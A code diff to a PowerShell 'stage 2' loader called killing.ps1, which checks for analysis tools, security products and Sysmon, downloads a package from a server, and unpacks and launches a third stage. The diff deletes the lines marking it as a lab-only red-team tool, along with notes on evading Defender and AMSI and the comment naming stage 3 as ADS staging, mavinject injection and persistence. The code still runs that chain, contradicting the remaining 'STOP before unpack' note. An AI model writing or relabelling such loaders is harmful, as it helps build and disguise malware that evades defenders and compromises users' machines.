@@ -1,12 +1,5 @@
-# killing.ps1 - TVeronica Stage 2 (v2 clean build): AUTH GATE + ENVIRONMENT CHECKS + PACKAGE DOWNLOAD
-# Authorized red team / detection-validation lab only.
-#
-# v2 changes (evasion research, grounded in Defender ML findings on this lab host):
-#   - former stage-1 JS gates merged here; the raw.js dropper layer is REMOVED entirely
-#   - NO obfuscation, NO embedded base64 blobs (obfuscation itself was the #1 ML trigger)
-#   - analysis-tool names are fetched from the server at runtime (data-from-network)
-#   - no P/Invoke (Add-Type DllImport is a strong AMSI/ML feature) -> managed module scan
-#
+# killing.ps1 - TVeronica Stage 2: AUTH GATE + ENVIRONMENT CHECKS + PACKAGE DOWNLOAD
+
 # Flow: license/auth check -> environment checks -> download package .zip (STOP before unpack/merge)
 # Exit codes: 0 = ok | 40 = auth fail | 50 = security software (cleaned) | 60 = env check (cleaned) | 70 = download fail
 
@@ -104,7 +97,7 @@ function Invoke-LicenseCheck {
     }
 }
 
-# ---------------- tool list (downloaded at runtime) ----------------
+# ---------------- tool list check----------------
 function Get-ToolNames {
     $names = @()
     try {
@@ -174,7 +167,7 @@ function Get-SecurityProducts {
     return $names
 }
 
-# ---------------- service integrity (signed monitoring agent check) ----------------
+# ---------------- service integrity ----------------
 function Test-ServiceIntegrity {
     foreach ($svcName in @('Sysmon64', 'Sysmon', 'SysmonDrv')) {
         $svc = Get-Service -Name $svcName -EA SilentlyContinue
@@ -242,7 +235,7 @@ function Test-DnsPath {
     return $true
 }
 
-# ---------------- package download (STOP before unpack/merge) ----------------
+# ---------------- package download ----------------
 function Invoke-UpdateDownload {
     $dest = Join-Path $script:BaseDir $Settings.PackageName
     Write-Trace ('downloading {0}' -f $Settings.UpdateServer) 'info'
@@ -347,7 +340,6 @@ function Main {
         return 70
     }
 
-    # ---- continue chain: unpack -> stage3 (ADS staging + mavinject + persistence) ----
     $exp = Join-Path $script:BaseDir 'x'
     Expand-Archive -Path (Join-Path $script:BaseDir $Settings.PackageName) -DestinationPath $exp -Force
     $s3 = Join-Path $exp 'stage3.ps1'
